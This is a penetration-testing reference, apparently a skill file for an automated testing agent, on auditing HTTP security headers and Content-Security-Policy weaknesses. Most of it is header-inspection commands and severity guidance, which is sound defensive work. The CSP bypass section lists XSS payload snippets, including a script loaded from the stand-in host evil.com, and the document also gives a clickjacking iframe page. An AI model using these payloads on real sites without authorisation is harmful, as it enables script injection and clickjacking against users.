# Security Headers / CSP Bypass Payload

> ⚠️ **Security Boundary Statement**
>
> This document is for **authorized penetration testing reference** only, helping identify security header misconfiguration and CSP bypass vulnerability risk characteristics.
>
> - All payloads are **technical principle demonstrations**, actual exploitation of misconfigurations prohibited
> - Security header testing is for understanding attack surface only, **no end-user attack execution**
> - Validation proves vulnerability existence (misconfiguration confirmed), **no data exfiltration**
> - See `SKILL.md` for specific execution boundaries
>
> **Core Principle**: Prove existence, do not enable harm

---

## Source: OWASP Secure Headers Project, HackTricks

## Manual Testing

**Note: Check security headers on every endpoint, test CSP bypass per policy**

---

## Validation Objectives (Within Security Boundary)

Security header and CSP bypass vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Missing Security Headers | ✓ Identify absent headers | - | Exploit absent protections |
| CSP Analysis | ✓ Identify weak directives | - | Execute malicious scripts |
| X-Frame-Options Bypass | ✓ Confirm clickjacking possibility | - | Execute clickjacking attack |
| HSTS Absence | ✓ Document missing HSTS | - | Execute MITM downgrade |
| Referrer-Policy Leak | ✓ Identify information leakage | - | Harvest leaked credentials |
| Permissions-Policy | ✓ Identify enabled browser features | - | Abuse browser features |

**Safe Validation Method**: Send requests and observe response headers; for CSP bypass, use harmless markers only.

---

## Security Header Analysis

### Complete Header Checklist

```bash
# Collect all response headers
curl -sI "https://target.com" -L

# Check specific security headers
curl -sI "https://target.com" | grep -iE "content-security-policy|x-frame-options|x-content-type-options|strict-transport-security|referrer-policy|permissions-policy|x-xss-protection"

# Automated header check
for header in "Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options" "Strict-Transport-Security" "Referrer-Policy" "Permissions-Policy" "X-XSS-Protection"; do
  result=$(curl -sI "https://target.com" | grep -i "^$header:")
  if [ -z "$result" ]; then
    echo "[MISSING] $header"
  else
    echo "[FOUND]   $result"
  fi
done
```

### Security Header Risk Assessment

**Core principle**: Missing security headers is "defense-in-depth missing", itself does not constitute actual impact. Severity is based on **whether the corresponding vulnerability actually exists** — not on "what it could theoretically cause". Default all missing headers to **Info/Low**, only escalate when the corresponding vulnerability is confirmed in this task.

| Header | Default | Only upgrade when corresponding vulnerability confirmed |
|-------|------|------------------------|
| Content-Security-Policy | Info (missing/weak policy)| -> High Only when XSS confirmed in this task and missing/bypassable CSP worsened the XSS |
| X-Frame-Options | Info (missing)| -> Medium Only when clickjackable sensitive operation page confirmed in this task |
| X-Content-Type-Options | Info (missing)| -> Low/Medium Only when upload/response exploitable via MIME sniffing confirmed |
| Strict-Transport-Security | Info (missing)| -> Low Only when in MITM-capable network position and testing in intranet/HTTP scenario; public HTTPS site missing has near-zero impact |
| Referrer-Policy | Info (missing)| -> Low Only when URL contains sensitive parameters confirmed to leak via Referer |
| Permissions-Policy | Info (missing)| -> Low Only when abusable browser feature combination confirmed |
| X-XSS-Protection | Info | Info (deprecated, enabling is harmful, no upgrade)|

**Anti-inflation rule**: Do not report "missing security header" alone as High/Critical. It either appears as **aggravating factor for confirmed vulnerability** (mentioned in corresponding XSS/clickjacking finding), or as Info-level hardening recommendation. Missing CSP does not equal XSS exists — only when XSS actually exists and CSP could mitigate it, does missing CSP have High value.

---

## Content-Security-Policy (CSP) Analysis

### CSP Directive Review

```bash
# Collect CSP header
csp=$(curl -sI "https://target.com" | grep -i "^content-security-policy:" | head -1)
echo "$csp"

# Check for common weaknesses in CSP
echo "$csp" | grep -i "unsafe-inline\|unsafe-eval\|data:\|*\|http:"
```

### CSP Weakness Patterns

| Weakness | Pattern | Bypass |
|----------|---------|--------|
| `unsafe-inline` | `script-src 'unsafe-inline'` | Inline script execution allowed |
| `unsafe-eval` | `script-src 'unsafe-eval'` | `eval()` and `new Function()` allowed |
| `data:` | `script-src data:` | Data URI script execution |
| Wildcard | `script-src *` | Any origin can load scripts |
| `http:` | `script-src http:` | Mixed content, no HTTPS enforcement |
| Missing `default-src` | No fallback | Only specific directives protected |
| `nonce-` with weak random | Short/predictable nonce | Brute force nonce |

### CSP Bypass Techniques (Proof Only)

```html
<!-- unsafe-inline allowed -->
<img src=x onerror=console.log('CSP-bypass-proof')>

<!-- unsafe-eval allowed -->
<script>eval("console.log('CSP-bypass-proof')")</script>

<!-- data: scheme allowed -->
<script src="data:text/javascript,console.log('CSP-bypass-proof')"></script>

<!-- Wildcard script-src -->
<script src="https://evil.com/proof.js"></script>

<!-- JSONP endpoint bypass -->
<script src="https://target.com/api/callback?cb=console.log('CSP-proof')"></script>
```

### CSP Bypass via JSONP (Requires Authorization)

```bash
# Find JSONP endpoints that may bypass CSP
curl -s "https://target.com/api/jsonp?callback=test" | grep "test"

# If CSP allows target domain and JSONP exists:
# This is proof of bypass possibility - do not execute
```

---

## X-Frame-Options Clickjacking Proof

### X-Frame-Options Check

```bash
# Check X-Frame-Options header
curl -sI "https://target.com" | grep -i "x-frame-options"

# Missing = vulnerable to clickjacking
# X-Frame-Options: DENY = secure
# X-Frame-Options: SAMEORIGIN = partially secure
# X-Frame-Options: ALLOW-FROM = deprecated, may be bypassed
```

### Clickjacking Proof of Concept

```html
<!-- Clickjacking proof - harmless marker only -->
<!DOCTYPE html>
<html>
<head><title>Clickjacking Proof</title></head>
<body>
<h1>Clickjacking Vulnerability Proof</h1>
<p>If this page renders inside an iframe, clickjacking is possible.</p>
<iframe src="https://target.com/sensitive-action" width="500" height="400"></iframe>
</body>
</html>
```

### CSP frame-ancestors Override

```bash
# CSP frame-ancestors takes precedence over X-Frame-Options
curl -sI "https://target.com" | grep -i "content-security-policy" | grep -i "frame-ancestors"

# frame-ancestors 'none' = DENY equivalent
# frame-ancestors 'self' = SAMEORIGIN equivalent
# Missing frame-ancestors = no CSP frame protection
```

---

## X-Content-Type-Options

```bash
# Check X-Content-Type-Options
curl -sI "https://target.com" | grep -i "x-content-type-options"

# X-Content-Type-Options: nosniff = secure
# Missing = browser may sniff MIME type

# Test MIME sniffing (upload/download endpoints)
curl -sI "https://target.com/upload?file=test.html" | grep -i "content-type"
# If Content-Type is ambiguous and nosniff missing: MIME sniffing possible
```

---

## Strict-Transport-Security (HSTS)

```bash
# Check HSTS header
curl -sI "https://target.com" | grep -i "strict-transport-security"

# Missing HSTS = vulnerable to protocol downgrade
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload = ideal

# Check if HTTP redirects to HTTPS
curl -sI "http://target.com" -L | grep -i "location\|strict-transport-security"

# HSTS preload status
# Check: https://hstspreload.org/?domain=target.com
```

### HSTS Risk Assessment

| Configuration | Risk |
|--------------|------|
| Missing | Protocol downgrade possible, first-visit MITM |
| `max-age=0` | HSTS disabled |
| Short `max-age` | Short protection window |
| Missing `includeSubDomains` | Subdomains not protected |
| Missing `preload` | Not in browser preload lists |

---

## Referrer-Policy

```bash
# Check Referrer-Policy
curl -sI "https://target.com" | grep -i "referrer-policy"

# Referrer-Policy values risk assessment:
# no-referrer = most secure (no referrer sent)
# same-origin = secure (referrer only to same origin)
# strict-origin = secure (only origin, HTTPS only)
# origin = moderate (only origin sent)
# unsafe-url = vulnerable (full URL sent to any origin)
# Missing = browser default (typically no-referrer-when-downgrade)
```

### Information Leakage via Referrer

```bash
# Test if sensitive parameters leak in referrer
# Check if external links receive full URL
curl -s "https://target.com/page?session=abc123" | grep -oE 'href="https://[^"]+"'

# If Referrer-Policy missing or unsafe-url:
# Full URL including parameters sent to external sites
```

---

## Permissions-Policy

```bash
# Check Permissions-Policy
curl -sI "https://target.com" | grep -i "permissions-policy\|feature-policy"

# Common features to check:
# camera, microphone, geolocation, payment, usb, magnetometer, etc.

# Missing Permissions-Policy = browser features available to any page
# Permissions-Policy: camera=(), microphone=() = secure (disabled)
# Permissions-Policy: camera=* = vulnerable (any origin)
```

---

## OWASP Category & CWE

| Category | Mapping |
|----------|---------|
| OWASP Web | A05:2021-Security Misconfiguration |
| CWE | CWE-693: Protection Mechanism Failure |
| CWE | CWE-1021: Improper Restriction of Rendered UI Layers or Frames |

---

## Analysis Process

1. Collect all response headers from target endpoints
2. Check each security header against recommended configuration
3. Parse and analyze CSP for bypass possibilities
4. Test X-Frame-Options / frame-ancestors with iframe proof
5. Evaluate HSTS configuration for downgrade risk
6. Assess Referrer-Policy for information leakage
7. Review Permissions-Policy for browser feature exposure
8. Document each misconfiguration as finding
9. **Stop validation**, report findings without exploiting misconfigurations

---

## Output

```markdown
## Vulnerability: Security Header Misconfiguration

### Location
{URL}

### Missing / Misconfigured Headers
- Content-Security-Policy: {missing / weak / present}
- X-Frame-Options: {missing / DENY / SAMEORIGIN}
- Strict-Transport-Security: {missing / present with details}
- X-Content-Type-Options: {missing / nosniff}
- Referrer-Policy: {missing / value}
- Permissions-Policy: {missing / present}

### CSP Analysis (if present)
- Directives: {list key directives}
- Weaknesses: {unsafe-inline, unsafe-eval, wildcard, etc.}
- Bypass possibilities: {JSONP, data:, wildcard origins}

### Validation Result
- Clickjacking possible: {yes/no}
- MIME sniffing possible: {yes/no}
- Protocol downgrade possible: {yes/no}
- Referrer information leakage: {yes/no}

### Risk Level
{Medium/High} - {specific misconfigurations} enable {attack types}
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Execute clickjacking attacks | Only prove iframe renders target page |
| ❌ Execute XSS via CSP bypass | Only document bypass possibility |
| ❌ Perform MITM downgrade attacks | Only document missing HSTS |
| ❌ Harvest leaked credentials | Only document referrer leakage pattern |
| ❌ Abuse browser features | Only document missing Permissions-Policy |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Only prove existence", "Do not enable harm"
- `README.md` -> Prohibited execution checklist